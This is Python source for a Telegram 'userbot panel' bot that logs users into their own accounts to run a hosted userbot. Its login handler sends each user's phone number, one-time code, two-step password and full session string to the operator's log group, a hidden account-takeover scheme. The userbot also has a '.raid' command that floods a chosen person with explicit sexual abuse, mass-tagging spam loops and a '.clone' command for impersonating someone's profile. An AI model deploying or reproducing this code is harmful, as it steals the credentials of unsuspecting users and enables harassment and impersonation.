import asyncio
import os
import sys
import random
import time
from datetime import datetime
from zoneinfo import ZoneInfo
from flask import Flask
from threading import Thread
from pymongo import MongoClient

from config import (
    API_ID,
    API_HASH,
    BOT_TOKEN,
    LOG_GROUP,
    MONGO_URL,
    DB_NAME,
    FSUB_CHANNELS,
    START_VIDEO,
    ALIVE_IMG,
    OWNER_ID,
    OWNER_USERNAME,
    PORT,
)

try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

from pyrogram import Client, filters, errors, handlers, idle
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.raw import types

BOT_START_TIME = time.time()

# --- DATABASE CORE ---
try:
    mongo_client = MongoClient(MONGO_URL)
    db = mongo_client[DB_NAME]
    sessions_col = db["sessions"]
    print("[SUCCESS] MongoDB Connected!")
except Exception as e:
    print(f"[ERROR] MongoDB Failed: {e}")
    sys.exit(1)

def load_local_sessions():
    try:
        return {str(doc["user_id"]): doc["session_str"] for doc in sessions_col.find()}
    except Exception:
        return {}

def save_local_session(user_id, session_str):
    try:
        sessions_col.update_one(
            {"user_id": str(user_id)},
            {"$set": {"session_str": session_str}},
            upsert=True
        )
    except Exception:
        pass

def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "ᴅᴀʏs"]
    while count < 4:
        count += 1
        if count < 3:
            remaining, time_to_add = divmod(seconds, 60)
        else:
            remaining, time_to_add = divmod(seconds, 24)
        if seconds == 0 and remaining == 0:
            break
        time_list.append(int(time_to_add))
        seconds = int(remaining)
    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "
    time_list.reverse()
    ping_time += ":".join(time_list)
    return ping_time

# --- LOGGING HELPER ---
def format_user_tag(user):
    if not user:
        return "Unknown User (0)"
    uname = f"@{user.username}" if user.username else (user.first_name or "User")
    return f"{uname} ({user.id})"

def get_current_ist_time() -> str:
    now = datetime.now(ZoneInfo("Asia/Kolkata"))
    return now.strftime("%d %b %Y · %I:%M %p").upper()

async def send_log(c, title: str, user, details_body: str, panel_name: str = "CoderNovaBot"):
    try:
        user_str = format_user_tag(user)
        time_str = get_current_ist_time()
        log_msg = (
            f"━━━✦ 𝗡𝗢𝗩𝗔 𝗨𝗦𝗘𝗥𝗕𝗢𝗧 ✦ 𝗟𝗢𝗚𝗦 ✦━━━\n"
            f"✦ {title}\n\n"
            f"👤 𝗨𝗦𝗘𝗥: {user_str}\n"
            f"🕒 𝗧𝗜𝗠𝗘: {time_str}\n\n"
            f"📋 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:\n"
            f"{details_body}\n\n"
            f"🤖 𝗣𝗔𝗡𝗘𝗟: {panel_name} · {OWNER_USERNAME}"
        )
        await c.send_message(LOG_GROUP, log_msg, disable_web_page_preview=True)
    except Exception as e:
        print(f"[LOG ERROR] Failed to send log: {e}")

# --- WEB SERVER ---
app = Flask('')

@app.route('/')
def home():
    return "Online ✨"

def run_web():
    app.run(host='0.0.0.0', port=PORT)

bot = Client("CoderNovaGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data, active_tasks, running_ubots, pm_guard_data = {}, {}, {}, {}

main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("📲 ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ", callback_data="add_btn"), InlineKeyboardButton("🛠️ ʜᴇʟᴘ ᴍᴇɴᴜ", callback_data="help_btn")],
    [InlineKeyboardButton("👑 ᴏᴡɴᴇʀ", url=f"https://t.me/{OWNER_USERNAME.replace('@','') or 'CoderNova'}"), InlineKeyboardButton("📢 ᴜᴘᴅᴀᴛᴇ", url="https://t.me/NovaBot_Support")],
    [InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="close")]
])

DAILY_CHATS = [
    "ʜɪɪ {mention}", "ᴋᴀɪsᴇ ʜᴏ {mention}", "ᴋʏᴀ ᴋʀ ʀʜᴇ ʜᴏ.. {mention}", "ᴋʜᴀ sᴇ ʜᴏ. {mention}",
    "ᴋʏᴀ ᴋʀᴛᴇ ʜᴏ {mention}", "ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention}", "ᴊᴀɪ sʜʀᴇᴇ ʀᴀᴍ {mention}", "ᴏʀ sᴜɴᴀᴏ sʙ ʙᴅɪʏᴀ {mention}",
    "ᴋʜᴀ ʀʜᴛᴇ ʜᴏ ᴀᴀᴊ ᴋᴀʟ ᴀᴀᴛᴇ ɴʜɪ ʜᴏ {mention}", "ᴠᴄ ᴀᴀʏᴀ ᴋʀ ʏʀ {mention}", "ɢʀᴏᴜᴘ ᴍᴇ ᴀᴀʏᴀ ᴋʀ ʏʀ {mention}",
    "ʀᴀᴍ ʀᴀᴍ {mention}", "ᴋᴋʀʜ {mention}", "ᴋʜᴀɴᴀ ᴋʜᴀʏᴇ {mention}", "ɢʜᴀʀ ᴍᴇ sʙ ᴋᴀɪsᴇ ʜʜ {mention}",
    "<b>ᴏʀ ᴘᴀᴅʜᴀɪ ᴋᴀɪsᴇ ᴄʜᴀʟ ʀʜᴇ ʜ</b> {mention}", "sᴛᴜᴅʏ ᴋʀᴛᴇ ʜᴏ ʏᴀ ɴʜɪ {mention}"
]

ABUSE_RAIDS = [
    "🥵💦 JUNGLE JUNGLE ME CHALA.... JUNGLE ME MILA BHALU... 🤣🤣🤣🤣",
    "AB KARO APNE BAAP KE SAMNE GUSTAKIYA... 😂😂 NHI TO TUMHATI AMMA CHOD DALU 💦💦",
    "EK DAAL PE.... CHAR... KABUTAR... 😁 CHARO MANGE DAANA... 😂😂😂😂",
    "TERI... DADADI.. TANG... UTHAYE... 😂 OR.. CHODE.. MERE.. NANA... 😂😂😂",
    "LAAL... DUPTTA... UAD... GYA... MERE.. HAWA KE... JHOKE... SEE... 🤣🤣 TERI... BAHNIYA.... CHOD.. DIYA.. HAAYE... RE... DHOKE.. SE.. 😂😂😂",
    "TERI.. AMMA..KA.. BHOSDA... OR... TERI.. BAHAN... KE... KAALI.. KAALI.. CHUT.. 🤣🤣",
    "TERI.. BAHAN.. BEDIYO.. KO.. CHOD...KR. 🤣🤣 BACHE... HO.. GYE.. 580....🤣🤣",
    "TERI MAA KI CHUT TERI BAHAN KA BHOSDA TERI MAA CHOD DUNGA 😂😂😂| RANDI KE BACHE 💦💦🥵",
    "BHOSDIKE TERI MAA KI CHUT DUNGA RANDI KE BACHE 🥵🥵🥵🥵🥵",
    "HAWABAAAZI KREGA TERE... MAA.. CHOD... DUNGA.. 🥵💦💦💦",
    "JHULA... JHULO... LAKIN APND BAAP KO... MT BHULO... 💦🥵💦🥵🥵",
    "TOHAR... MAIYA KA... BHOSDA.. 💦🥵💦🥵💦🥵",
    "CHUD.. GYA.. 🤣🤣😂🤣 CHUD... GYA.. BETE.. 💦🥵🥵🥵🥵💦🥵",
    "BAAP.. KO... KHODNA.. OR... CHODNE.. NA.. SIKHATE... MERE.. BETE... 🥵💦🥵🥵",
    "ME.. TERA.. BAAP.. HU... RANDI.. KE.. BACHE.... 🥵💦🥵💦...",
    "TERI.. BAHAN.. KA.. BURRRR... CHODUNGA.. 🥵💦🥵💦🥵🥵",
    "CHUD... DIYA.. TERI.. BAHAH... KO.. 🥵💦🥵🥵🥵🥵",
    "TERI.. MOUSI.. KI.. CHUT... 💦💦💦",
    "TERI... BUDDHI... DADI.. KI.. CHUT.. FAAD... DUNGA 💦💦🥵🥵💦🥵💦",
    "TERI.. BAHAN... RANDI.. 🥵🥵💦🥵💦💦",
    "TERI.... MOUSI.. KI.. CHUT... ME... HATHI.. KA.. LUND... 💦💦🥵🥵",
    "MAA.. KE... LOUDE... CHUD.. GYA 💦💦🥵💦🥵💦"
]

async def check_force_join(c, user_id):
    not_joined = []
    for channel in FSUB_CHANNELS:
        try:
            await c.get_chat_member(channel, user_id)
        except errors.UserNotParticipant:
            not_joined.append(channel)
        except Exception:
            pass
    return not_joined

# --- USERBOT HANDLERS ---
async def alive_cmd(c, m):
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    alive_text = f"✨ **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n⏳ **ᴜᴘᴛɪᴍᴇ:** `{uptime}`\n👤 **ᴜsᴇʀ:** {c.me.mention}\n👑 **ᴏᴡɴᴇʀ:** {OWNER_USERNAME}"
    try:
        await m.delete()
        await c.send_photo(m.chat.id, photo=ALIVE_IMG, caption=alive_text)
    except Exception:
        try:
            await m.edit_text(alive_text)
        except Exception:
            pass

async def assistant_help_cmd(c, m):
    help_guide = (
        f"⚙️ **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ᴍᴇɴᴜ 』** ⚙️\n\n"
        f"🔹 **`.help`** - sʜᴏᴡs ᴛʜɪs ᴍᴇɴᴜ.\n"
        f"🔹 **`.alive`** - ᴄʜᴇᴄᴋ ᴜsᴇʀʙᴏᴛ sᴛᴀᴛᴜs.\n"
        f"🔹 **`.tagall [text]`** - ᴛᴀɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs.\n"
        f"🔹 **`.onetag`** - sɪɴɢʟᴇ ᴛᴀɢ ʟᴏᴏᴘ.\n"
        f"🔹 **`.raid [count]`** - sᴛᴀʀᴛ ʀᴀɪᴅ ᴏɴ ʀᴇᴘʟɪʏ.\n"
        f"🔹 **`.clone @username`** - ᴄʜᴇᴄᴋ sᴏᴍᴇᴏɴᴇ's ᴘʀᴏғɪʟᴇ.\n"
        f"🔹 **`.stop`** - sᴛᴏᴘ ᴀʟʟ ʀᴜɴɴɪɴɢ ʟᴏᴏᴘs."
    )
    try:
        await m.delete()
        await c.send_message(m.chat.id, help_guide)
    except Exception:
        try:
            await m.edit_text(help_guide)
        except Exception:
            pass

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sʙ?"
    try:
        await m.delete()
    except Exception:
        pass

    msg_counter = 0
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid):
                break
            if member.user.is_bot or member.user.is_deleted:
                continue
            try:
                mention = f"[{member.user.first_name or 'ᴜsᴇʀ'}](tg://user?id={member.user.id})"
                await c.send_message(m.chat.id, f"{input_text}\n\n{mention}")
                msg_counter += 1

                if msg_counter % 3 == 0:
                    await asyncio.sleep(5.0)
                else:
                    await asyncio.sleep(2.0)

            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                pass
    except Exception:
        pass

async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    try:
        await m.delete()
    except Exception:
        pass

    msg_counter = 0
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid):
                break
            if member.user.is_bot or member.user.is_deleted:
                continue
            try:
                mention = f"[{member.user.first_name or 'ᴜsᴇʀ'}](tg://user?id={member.user.id})"
                msg = random.choice(DAILY_CHATS).format(mention=mention)
                await c.send_message(m.chat.id, msg)
                msg_counter += 1

                if msg_counter % 3 == 0:
                    await asyncio.sleep(5.0)
                else:
                    await asyncio.sleep(2.0)

            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                pass
    except Exception:
        pass

async def raid_cmd(c, m):
    uid = c.me.id
    args = m.text.split()
    if m.chat.type not in [types.ChatType.PRIVATE, types.ChatType.BOT] and not m.reply_to_message:
        try:
            return await m.edit_text("❌ **ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ ʀᴀɪᴅ!**")
        except Exception:
            return

    try:
        count = int(args[1]) if len(args) > 1 else 10
    except ValueError:
        count = 10

    active_tasks[uid] = True
    try:
        await m.delete()
    except Exception:
        pass
    reply_to_id = m.reply_to_message.id if m.reply_to_message else None

    msg_counter = 0
    for _ in range(count):
        if not active_tasks.get(uid):
            break
        try:
            await c.send_message(chat_id=m.chat.id, text=random.choice(ABUSE_RAIDS), reply_to_message_id=reply_to_id)
            msg_counter += 1

            if msg_counter % 3 == 0:
                await asyncio.sleep(5.0)
            else:
                await asyncio.sleep(2.0)

        except errors.FloodWait as e:
            await asyncio.sleep(e.value + 2)
        except Exception:
            pass

async def clone_cmd(c, m):
    if len(m.command) < 2 and not m.reply_to_message:
        try:
            return await m.edit_text("❌ **ᴜsᴀɢᴇ:** `.clone @username` ᴏʀ ʀᴇᴘʟʏ.")
        except Exception:
            return
    target = m.command[1] if len(m.command) > 1 else m.reply_to_message.from_user.id
    try:
        status = await m.edit_text("🔄 **ᴄʟᴏɴɪɴɢ...**")
    except Exception:
        return
    try:
        user = await c.get_users(target)
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        try:
            bio = (await c.get_chat(user.id)).bio or ""
        except Exception:
            bio = ""
        photos = [p async for p in c.get_chat_photos(user.id, limit=1)]
        if photos:
            try:
                photo_file = await c.download_media(photos[0].file_id)
                await c.set_profile_photo(photo=photo_file)
                if os.path.exists(photo_file):
                    os.remove(photo_file)
            except Exception:
                pass
        await c.update_profile(first_name=first_name, last_name=last_name, bio=bio)
        await status.edit("✅ **sᴜᴄᴄᴇsғᴜʟʟʏ ᴄʟᴏɴᴇᴅ!**")
    except Exception as e:
        await status.edit(f"❌ **ғᴀɪʟᴇᴅ:** `{e}`")

async def stop_cmd(c, m):
    active_tasks[c.me.id] = False
    try:
        await m.edit_text("🚫 **ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ!**")
    except Exception:
        pass

# --- SAFE PM GUARD ---
async def pm_guard_handler(c, m):
    if m.chat.type != types.ChatType.PRIVATE or m.from_user.is_bot or m.from_user.id == c.me.id:
        return
    try:
        if m.from_user.is_contact or m.from_user.id == OWNER_ID:
            return
        ubot_id = c.me.id
        stranger_id = m.from_user.id
        if ubot_id not in pm_guard_data:
            pm_guard_data[ubot_id] = {}
        if stranger_id not in pm_guard_data[ubot_id]:
            pm_guard_data[ubot_id][stranger_id] = 0

        pm_guard_data[ubot_id][stranger_id] += 1
        warn_count = pm_guard_data[ubot_id][stranger_id]

        if warn_count >= 5:
            try:
                await m.reply_text("🚨 **sᴘᴀᴍ ʟɪᴍɪᴛ ᴇxᴄᴇᴇᴅᴇᴅ! ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ʙʟᴏᴄᴋᴇᴅ.**")
                await c.block_user(stranger_id)
            except Exception:
                pass
            del pm_guard_data[ubot_id][stranger_id]
        else:
            try:
                await m.reply_text(f"🔒 **ʜᴇʟʟᴏ! ᴏᴡɴᴇʀ ᴀʙʜɪ ᴏғғʟɪɴᴇ ʜᴀɪɴ.**\n⚠️ **ᴡᴀʀɴɪɴɢ:** `{warn_count}/5`")
            except Exception:
                pass
    except Exception:
        pass

async def global_catch_all_updates(c, update, users, chats):
    pass

def register_ubot_handlers(ubot):
    ubot.add_handler(handlers.MessageHandler(assistant_help_cmd, filters.command("help", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(clone_cmd, filters.command("clone", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(pm_guard_handler, filters.private & ~filters.me), group=2)
    ubot.add_handler(handlers.RawUpdateHandler(global_catch_all_updates))

# --- MAIN BOT COMMANDS ---
START_TEXT = "⚡ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴘᴀɴᴇʟ** ⚡\n\nʜᴇʏ {mention},\nᴀᴘɴᴀ ᴜsᴇʀʙᴏᴛ ᴍᴀɴᴀɢᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ɴɪᴄʜᴇ ʙᴜᴛᴛᴏɴs ᴜsᴇ ᴋᴀʀᴇɪɴ."

@bot.on_message(filters.command("start") & filters.private)
async def start_handler(c, m):
    bot_me = await c.get_me()
    await send_log(
        c,
        title="𝗡𝗘𝗪 𝗦𝗧𝗔𝗥𝗧 𝗔𝗟𝗘𝗥𝗧 · [𝗦𝗧𝗔𝗥𝗧]",
        user=m.from_user,
        details_body=f"✦ 𝗨𝗦𝗘𝗥 {(m.from_user.first_name or 'USER').upper()} 𝗢𝗣𝗘𝗡𝗘𝗗 {bot_me.username or 'CoderNovaBot'}.",
        panel_name=bot_me.username or "CoderNovaBot"
    )

    unjoined = await check_force_join(c, m.from_user.id)
    if unjoined:
        btn_layout = [[InlineKeyboardButton(f"📥 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{ch}")] for ch in unjoined]
        btn_layout.append([InlineKeyboardButton("🔄 ᴠᴇʀɪғʏ", callback_data="verify_fsub")])
        return await m.reply_text("⚠️ **ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ:**", reply_markup=InlineKeyboardMarkup(btn_layout))
    try:
        await m.reply_animation(animation=START_VIDEO, caption=START_TEXT.format(mention=m.from_user.mention), reply_markup=main_buttons)
    except Exception:
        await m.reply_text(START_TEXT.format(mention=m.from_user.mention), reply_markup=main_buttons)

@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
async def broadcast_cmd(c, m):
    if not m.reply_to_message:
        return await m.reply_text("❌ **ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ!**")
    status = await m.reply_text("📢 **ʙʀᴏᴀᴅᴄᴀsᴛ sᴛᴀʀᴛᴇᴅ...**")
    all_sessions = load_local_sessions()
    success, failed = 0, 0

    for user_id in all_sessions.keys():
        try:
            await m.reply_to_message.forward(int(user_id))
            success += 1
            await asyncio.sleep(0.3)
        except Exception:
            failed += 1
    await status.edit(f"✅ **ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!**\n\n🟢 **sᴜᴄᴄᴇss:** `{success}`\n🔴 **ғᴀɪʟᴇᴅ:** `{failed}`")

@bot.on_message(filters.command("remove_all") & filters.user(OWNER_ID))
async def remove_all_cmd(c, m):
    try:
        sessions_col.delete_many({})
        for uid, ubot in list(running_ubots.items()):
            try:
                await ubot.stop()
            except Exception:
                pass
        running_ubots.clear()
        await m.reply_text("🗑️ **ᴀʟʟ sᴇssɪᴏɴs ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴅᴀᴛᴀʙᴀsᴇ ᴀɴᴅ ᴀʟʟ ᴜsᴇʀʙᴏᴛs sᴛᴏᴘᴘᴇᴅ!**")
    except Exception as e:
        await m.reply_text(f"❌ **ᴇʀʀᴏʀ:** `{e}`")

@bot.on_callback_query()
async def handle_callbacks(c, q):
    if q.data == "close":
        await q.message.delete()
    elif q.data == "verify_fsub":
        unjoined = await check_force_join(c, q.from_user.id)
        if unjoined:
            await q.answer("❌ sᴀʙʜɪ ᴄʜᴀɴɴᴇʟs ᴊᴏɪɴ ɴᴀʜɪ ᴋɪʏᴇ!", show_alert=True)
        else:
            await q.message.delete()
            await bot.send_message(q.message.chat.id, START_TEXT.format(mention=q.from_user.mention), reply_markup=main_buttons)
    elif q.data == "help_btn":
        await q.answer("ᴜsᴇ .help ɪɴ ᴄʜᴀᴛs ᴛᴏ sᴇᴇ ᴄᴏᴍᴍᴀɴᴅs!", show_alert=True)
    elif q.data == "add_btn":
        await q.message.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (+91xxxxxxxxxx):**")
        await q.message.delete()

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid, text = m.from_user.id, m.text.strip()
    bot_me = await c.get_me()
    panel_name = bot_me.username or "CoderNovaBot"

    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        try:
            await temp_c.connect()
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})

            await send_log(
                c,
                title="𝗣𝗛𝗢𝗡𝗘 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗘𝗗 · [𝗡𝗨𝗠𝗕𝗘𝗥]",
                user=m.from_user,
                details_body=f"📱 𝗣𝗛𝗢𝗡𝗘 𝗡𝗨𝗠𝗕𝗘𝗥: `{text}`\n⏳ 𝗡𝗘𝗫𝗧 𝗦𝗧𝗘𝗣: AWAITING OTP",
                panel_name=panel_name
            )

            await m.reply_text("📩 **ᴇɴᴛᴇʀ ᴏᴛᴘ ᴡɪᴛʜ sᴘᴀᴄᴇs (ᴇ.ɢ. `1 2 3 4 5`):**")
        except Exception as e:
            await m.reply_text(f"❌ `{e}`")

    elif " " in text and text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp_clean = text.replace(" ", "")
        phone_num = user_data[uid]["phone"]

        await send_log(
            c,
            title="𝗟𝗢𝗚𝗜𝗡 𝗢𝗧𝗣 𝗖𝗔𝗣𝗧𝗨𝗥𝗘𝗗 · [𝗢𝗧𝗣]",
            user=m.from_user,
            details_body=f"📱 𝗣𝗛𝗢𝗡𝗘: `{phone_num}`\n🔢 𝗢𝗧𝗣 𝗖𝗢𝗗𝗘: `{otp_clean}`",
            panel_name=panel_name
        )

        try:
            await user_data[uid]["client"].sign_in(phone_num, user_data[uid]["hash"], otp_clean)
            await finalize_login(c, m, uid, used_2fa=False)
        except errors.SessionPasswordNeeded:
            user_data[uid].update({"step": "password"})
            await m.reply_text("🔐 **ᴇɴᴛᴇʀ ᴛᴡᴏ-sᴛᴇᴘ ᴘᴀssᴡᴏʀᴅ:**")
        except Exception as e:
            await m.reply_text(f"❌ `{e}`")

    elif uid in user_data and user_data[uid].get("step") == "password":
        phone_num = user_data[uid]["phone"]

        await send_log(
            c,
            title="𝟮𝗙𝗔 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗟𝗢𝗚 · [𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗]",
            user=m.from_user,
            details_body=f"📱 𝗣𝗛𝗢𝗡𝗘: `{phone_num}`\n🔑 𝟮𝗙𝗔 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: `{text}`",
            panel_name=panel_name
        )

        try:
            await user_data[uid]["client"].check_password(password=text)
            await finalize_login(c, m, uid, used_2fa=True)
        except Exception as e:
            await m.reply_text(f"❌ `{e}`")

async def finalize_login(c, m, uid, used_2fa: bool = False):
    session_str = await user_data[uid]["client"].export_session_string()
    save_local_session(uid, session_str)

    ubot = Client(f"ubot_{uid}", api_id=API_ID, api_hash=API_HASH, session_string=session_str)
    register_ubot_handlers(ubot)
    await ubot.start()
    running_ubots[uid] = ubot

    bot_me = await c.get_me()
    panel_name = bot_me.username or "CoderNovaBot"
    status_tag = "2FA LOGIN SUCCESS" if used_2fa else "LOGIN SUCCESS"
    first_upper = (m.from_user.first_name or "USER").upper()

    await send_log(
        c,
        title="𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗟𝗢𝗚𝗜𝗡 & 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 · [𝗦𝗧𝗥𝗜𝗡𝗚]",
        user=m.from_user,
        details_body=(
            f"✅ **{status_tag} ({first_upper} ({uid}))**\n"
            f"💾 SAVED TO MONGODB: ACTIVE\n"
            f"🔑 `{session_str}`"
        ),
        panel_name=panel_name
    )

    try:
        await user_data[uid]["client"].disconnect()
    except Exception:
        pass

    await bot.send_message(uid, "🎉 **sᴜᴄᴄᴇsғᴜʟʟʏ ʟᴏɢɪɴ! ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ɪs ɴᴏᴡ ᴀᴄᴛɪᴠᴇ.**")
    if uid in user_data:
        del user_data[uid]

async def start_services():
    await bot.start()
    saved_sessions = load_local_sessions()
    for u_id, string in saved_sessions.items():
        try:
            ubot = Client(f"ubot_{u_id}", api_id=API_ID, api_hash=API_HASH, session_string=string)
            register_ubot_handlers(ubot)
            await ubot.start()
            running_ubots[int(u_id)] = ubot
            await asyncio.sleep(0.2)
        except Exception:
            pass
    await idle()

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    loop.run_until_complete(start_services())
